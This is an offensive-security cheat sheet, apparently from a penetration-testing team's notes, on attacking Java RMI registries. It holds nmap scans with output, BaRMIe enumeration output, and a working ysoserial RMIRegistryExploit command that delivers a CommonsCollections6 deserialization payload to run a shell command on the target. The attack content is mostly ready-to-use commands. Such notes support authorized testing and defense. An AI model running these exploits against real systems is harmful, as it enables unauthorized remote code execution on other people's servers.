<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Java RMI
https://attack.mitre.org/techniques/T1203/
Default port: `1099`

## Tools
- Java RMI enumeration and attack tool - ([BaRMIe GitHub](https://github.com/NickstaDB/BaRMIe))

References:
- ([Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet))

## nmap example
~~~
$ nmap --script rmi-vuln-classloader -sV --version-all -p 1099 10.0.0.2

PORT     STATE SERVICE  VERSION
1099/tcp open  java-rmi Java RMI
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb


$ nmap --script rmi-dumpregistry -sV --version-all -p 1099 10.0.0.2

PORT     STATE SERVICE  VERSION
1099/tcp open  java-rmi Java RMI
| rmi-dumpregistry:
|   com.transplace.app.tms.common.DesktopClientSuiteRmiService
|      implements com.transplace.app.tms.common.DesktopClientSuiteRmiService,
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @10.35.7.157:1099
|             extends
|_              java.rmi.server.RemoteObject
~~~

## ysoserial example
~~~
# download ysoserial
$ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 10.0.0.2 1099 CommonsCollections6 "touch /tmp/pwned"
~~~

## BaRMIe example
~~~
# identify RMI port with nmap
$ nmap --script rmi-dumpregistry.nse -sV --version-all -p 1099 10.0.0.2
...
PORT     STATE SERVICE  VERSION
1099/tcp open  java-rmi Java RMI
...

# download BaRMIe
$ wget https://github.com/NickstaDB/BaRMIe/releases/download/v1.01/BaRMIe_v1.01.jar

# run BaRMIe
$ java -jar BaRMIe_v1.01.jar -enum 10.0.0.2 1099
...
Scanning 1 target(s) for objects exposed via an RMI registry...

[-] An exception occurred during the PassThroughProxyThread main loop.
        java.net.SocketException: Socket closed
[-] An exception occurred during the ReplyDataCapturingProxyThread main loop.
        java.net.SocketException: Socket closed
RMI Registry at 10.0.0.2:1099
Objects exposed: 1
Object 1
  Name: com.transplace.app.tms.common.DesktopClientSuiteRmiService
  Endpoint: 10.0.0.2:1099
  Classes: 2
    Class 1
      Classname: java.lang.reflect.Proxy
    Class 2
      Classname: com.transplace.app.tms.common.DesktopClientSuiteRmiService

1 potential attacks identified (+++ = more reliable)
[---] Java RMI registry illegal bind deserialization

0 deserialization gadgets found on leaked CLASSPATH
[~] Gadgets may still be present despite CLASSPATH not being leaked

Successfully scanned 1 target(s) for objects exposed via RMI.
~~~